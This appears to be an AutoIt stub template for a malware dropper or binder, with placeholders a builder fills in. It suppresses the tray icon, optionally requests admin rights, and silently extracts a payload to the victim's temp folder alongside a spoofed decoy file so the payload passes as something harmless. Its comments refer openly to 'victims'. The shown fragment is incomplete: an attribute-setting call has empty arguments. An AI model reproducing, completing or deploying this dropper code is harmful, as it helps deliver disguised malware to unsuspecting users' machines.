#NoTrayIcon
{0} ;#RequireAdmin pre-processor place holder

Global $arguments = "{1}"   ;Payload arguments placeholder (string)
Global $cmd = {2}         ;Execute through console (bool)
Global $cmdstream = {3}   ;Stream console output to a text file (bool)
Global $execdrive = {4}   ;Execute in victims' drive (bool)
Global $waitpayload = {5} ;Wait for payload to finish (bool)
Global $nmpayload = "{6}"
Global $nmspoof = "{7}"
Global $drive = StringLeft(@ScriptDir, 3)

Func extractFiles()
    ;Extract the Payload
    Local $payloadtarget
    If $execdrive Then
        $payloadtarget = @TempDir & "\" & $nmpayload
    Else
        $payloadtarget = $nmpayload
    EndIf
    FileInstall("$payloadtmp", $payloadtarget, 1)

    FileSetAttrib("", "")

    ;Extract the Spoofed File
    FileInstall("$spooftmp", $nmspoof, 1)

EndFunc

